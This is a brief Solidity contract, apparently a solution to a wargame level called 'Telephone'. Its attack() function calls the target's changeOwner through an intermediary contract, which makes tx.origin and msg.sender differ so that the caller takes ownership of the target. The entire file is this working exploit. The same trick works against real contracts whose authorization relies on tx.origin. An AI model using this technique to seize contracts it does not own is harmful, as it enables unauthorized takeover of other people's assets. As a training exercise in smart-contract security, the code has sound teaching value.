// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface Telehpone {
    function changeOwner(address) external;
}

contract AttackTelephone {
    Telehpone private telephoneContract;

    constructor(address telephoneAddress) {
        telephoneContract = Telehpone(telephoneAddress);
    }

    function attack() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
